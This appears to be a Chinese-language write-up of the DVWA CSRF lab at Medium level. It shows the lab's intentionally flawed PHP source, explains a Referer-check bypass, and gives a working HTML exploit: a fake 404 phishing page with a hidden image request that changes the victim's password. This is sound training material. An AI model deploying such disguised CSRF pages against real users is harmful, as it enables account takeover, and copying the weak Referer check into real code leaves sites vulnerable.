# CSRF - Medium

## View Source

```PHP
 <?php

if( isset( $_GET[ 'Change' ] ) ) {
    // Checks to see where the request came from
    if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false ) {
        // Get input
        $pass_new  = $_GET[ 'password_new' ];
        $pass_conf = $_GET[ 'password_conf' ];

        // Do the passwords match?
        if( $pass_new == $pass_conf ) {
            // They do!
            $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
            $pass_new = md5( $pass_new );

            // Update the database
            $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
            $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

            // Feedback for the user
            echo "<pre>Password Changed.</pre>";
        }
        else {
            // Issue with passwords matching
            echo "<pre>Passwords did not match.</pre>";
        }
    }
    else {
        // Didn't come from a trusted source
        echo "<pre>That request didn't look correct.</pre>";
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>
```

- [`isset()`](https://www.php.net/manual/zh/function.isset.php)
    - 檢查變數是否已設置
    - I.e., *Change* 按鈕按下去
- [`stripos($a, $b)`](https://www.php.net/manual/zh/function.stripos.php)
    - 回傳 *b* 在 *a* 中的位置 (不分大小寫)
- [*HTTP Referer*](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referer)
    - *The Referer HTTP request header contains the absolute or partial address from which a resource has been requested.*
    - I.e., *request* 從哪裡來
- *$_SERVER[ 'SERVER_NAME' ]*
    - 可以至 *Setup / Reset DB* 頁面看到 `Web Server SERVER_NAME: 127.0.0.1`

## Code Review

- *HTTP_REFERER* 含有 *SERVER_NAME* 且輸入的兩個密碼相同就做 *md5* 更新密碼
- 使用者正常操作時 `Referer: http://127.0.0.1/vulnerabilities/csrf/`

## Answer

### Burp Suite

- 使用 *Proxy* 功能攔截 *request* 封包再加上 *Referer*

### Exploit

1. 構造如 *Low level* 的惡意連結等
2. 設計一個顯示 *404* 的釣魚網頁誘騙使用者瀏覽
3. 檔名取 *SERVER_NAME*
    - `127.0.0.1.html`
4. `python3 -m http.server` 快速架設
    - *The Referer can not be sent by the browsers if the resource is the local file or data.*
5. 瀏覽 `http://0.0.0.0:8000/127.0.0.1.html`

### Example

- 詳見 *Sample code*
```HTML
<!DOCTYPE html>

<!-- https://codepen.io/akashrajendra/pen/JKKRvQ -->

<html lang="en">
    <head>
        <meta name="referrer" content="unsafe-url">
        <title>CSRF Demo</title>
        <link type="text/css" rel="stylesheet" href="css/style.css" />
    </head>
    <body>
        <div id="main">
            <div class="fof">
                <h1>Error 404</h1>
            </div>
        </div>
        <!-- <a href="https://bit.ly/3iF8Sxi">View my Pictures!</a> -->
        <img src="http://127.0.0.1/vulnerabilities/csrf/?password_new=123&password_conf=123&Change=Change#" width="0" height="0" border="0" style="display:none">
    </body>
</html>
```

### Note

- 建議過程中可以使用 *Burp Suite* 的 *Proxy* 觀察封包情況 

#### 可能遇到的問題

- 新版瀏覽器可能會遇到 *302* 被轉到 *login.php* 導致失敗
- 因為 *Cookie* 的 *SameSite* 預設會是 *Lax*
    - [SameSite cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite)
    - [2020 年 2 月開始實施的 Chrome 違規處置](https://developers.google.com/search/blog/2020/01/get-ready-for-new-samesitenone-secure?hl=zh-tw#chrome-enforcement-starting-in-february-2020)
- 所以在跨域情況下，只有少數的 *HTML tag* 可以夾帶 *Cookie*
- 解決方法
    1. 使用 *Lax* 允許的方式，例如 `<a>`
    2. 繞過它 (？) 沒嘗試過
        - E.g., [Bypassing SameSite cookie restrictions](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions#lax)
- 如果只是要嘗試效果，可直接存取 `http://127.0.0.1:8000/127.0.0.1.html` 比較方便
    - 因為 `python -m http.server` 預設是開在 `0.0.0.0`
    - [Difference between 127.0.0.1 and 0.0.0.0](https://www.geeksforgeeks.org/difference-between-127-0-0-1-and-0-0-0-0/)